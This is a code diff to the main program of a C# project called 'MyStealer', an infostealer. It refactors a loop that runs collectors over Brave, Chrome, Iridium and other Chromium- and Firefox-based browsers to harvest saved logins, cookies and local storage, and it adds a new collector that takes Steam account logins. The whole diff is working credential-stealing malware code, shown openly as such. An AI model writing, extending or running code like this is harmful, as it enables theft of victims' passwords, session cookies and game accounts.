@@ -1,7 +1,7 @@
-﻿using MyStealer.Collectors;
-using MyStealer.Collectors.Browser;
+﻿using MyStealer.Collectors.Browser;
 using MyStealer.Collectors.Browser.ChromiumBased;
 using MyStealer.Collectors.Browser.FirefoxBased;
+using MyStealer.Collectors.Game;
 using Serilog;
 using System;
 using System.Collections.Generic;
@@ -14,7 +14,7 @@ namespace MyStealer
     {
         private const string LogTemplate = "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] <{Module:l}> {Message:lj}{NewLine}{Exception}";
 
-        private static readonly IBrowserCollector[] BrowserCollectors = new IBrowserCollector[] {
+        private static readonly BrowserCollectorBase[] BrowserCollectors = new BrowserCollectorBase[] {
             new Brave(),
             new Chrome(),
             new IridiumBrowser(),
@@ -51,23 +51,23 @@ namespace MyStealer
 
                     Log.Information("Program entry point called on: {date}", DateTime.Now);
 
-                    var creds = new HashSet<CredentialEntry>();
-                    var cookies = new HashSet<CookieEntry>();
-                    var localStorage = new HashSet<LocalStorageEntry>();
+                    var creds = new HashSet<BrowserLogin>();
+                    var cookies = new HashSet<BrowserCookie>();
+                    var localStorage = new HashSet<BrowserLocalStorage>();
                     foreach (var browser in BrowserCollectors)
                     {
                         try
                         {
                             var sw = new Stopwatch();
-                            Log.Debug("Check if browser is available: {browser}", browser.ApplicationName);
+                            Log.Debug("Check if browser is available: {browser}", browser.ModuleName);
                             if (browser.IsAvailable())
                             {
                                 sw.Start();
-                                Log.Information("Running browser data collector: {browser}", browser.ApplicationName);
+                                Log.Information("Running browser data collector: {browser}", browser.ModuleName);
                                 browser.Initialize();
                                 try
                                 {
-                                    foreach (var cred in browser.GetCredentials())
+                                    foreach (var cred in browser.GetLogins())
                                     {
                                         creds.Add(cred);
 #if DEBUG
@@ -77,7 +77,7 @@ namespace MyStealer
                                 }
                                 catch (Exception ex)
                                 {
-                                    Log.Error(ex, "Browser credentials {name} failed.", browser.ApplicationName);
+                                    Log.Error(ex, "Browser credentials {name} failed.", browser.ModuleName);
                                 }
 
                                 try
@@ -92,7 +92,7 @@ namespace MyStealer
                                 }
                                 catch (Exception ex)
                                 {
-                                    Log.Error(ex, "Browser cookies {name} failed.", browser.ApplicationName);
+                                    Log.Error(ex, "Browser cookies {name} failed.", browser.ModuleName);
                                 }
 
                                 try
@@ -107,22 +107,26 @@ namespace MyStealer
                                 }
                                 catch (Exception ex)
                                 {
-                                    Log.Error(ex, "Browser storages {name} failed.", browser.ApplicationName);
+                                    Log.Error(ex, "Browser storages {name} failed.", browser.ModuleName);
                                 }
 
                                 sw.Stop();
-                                Log.Debug("Browser collector {browser} took {time} ms", browser.ApplicationName, sw.ElapsedMilliseconds);
+                                Log.Debug("Browser collector {browser} took {time} ms", browser.ModuleName, sw.ElapsedMilliseconds);
                             }
                         }
                         catch (Exception ex)
                         {
-                            Log.Error(ex, "Browser collector {name} failed.", browser.ApplicationName);
+                            Log.Error(ex, "Browser collector {name} failed.", browser.ModuleName);
                         }
                         finally
                         {
                             browser.Dispose(); // Unload natives
                         }
                     }
+
+                    var st = new Steam();
+                    if (st.IsAvailable())
+                        st.GetLogins();
 
                     /* Cleanup */
 
